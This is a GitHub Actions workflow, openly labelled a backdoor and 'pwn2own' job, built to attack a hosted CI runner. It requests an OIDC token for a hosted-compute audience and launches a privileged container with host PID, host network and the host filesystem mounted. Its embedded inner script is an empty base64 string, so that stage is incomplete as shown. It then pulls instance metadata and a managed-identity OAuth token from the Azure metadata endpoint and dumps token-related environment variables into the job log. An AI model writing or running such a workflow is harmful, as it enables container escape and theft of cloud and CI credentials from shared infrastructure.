name: HC OIDC Primer v12 - Full Config + Backdoor Log
on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  pwn2own:
    runs-on: ubuntu-latest
    timeout-minutes: 55
    steps:
      - name: Step1 - HC JWT + orchestrators
        run: |
          echo "=== STEP 1: HC OIDC JWT ==="
          HC_JWT=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" \
            | jq -r .value)
          echo "HC_JWT_LENGTH=${#HC_JWT}"

      - name: Step2 - Privileged docker v12 inner script
        run: |
          echo "=== STEP 2: PRIVILEGED DOCKER v12 ==="
          echo "" | base64 -d > /tmp/inner.sh
          chmod +x /tmp/inner.sh
          echo "=== RUNNING PRIVILEGED DOCKER ==="
          docker run --rm \
            --privileged \
            --pid=host \
            --network=host \
            -v /:/host \
            -v /tmp/inner.sh:/inner.sh \
            -e ACTIONS_ID_TOKEN_REQUEST_TOKEN="$ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            -e ACTIONS_ID_TOKEN_REQUEST_URL="$ACTIONS_ID_TOKEN_REQUEST_URL" \
            alpine:latest \
            sh /inner.sh

      - name: Step3 - IMDS + env dump
        run: |
          echo "=== STEP 3: IMDS ==="
          curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq . || true
          curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq . || true
          echo "=== ENV ==="
          env | grep -iE "ACTIONS|GITHUB|RUNNER|TOKEN" | grep -v "_TOKEN_REQUEST" | grep -v "SECRET" || true
          cat /tmp/hc_pwn3.log 2>/dev/null && echo "PWN3_LOG_HOST_FOUND" || echo "PWN3_LOG_HOST_NOT_FOUND"
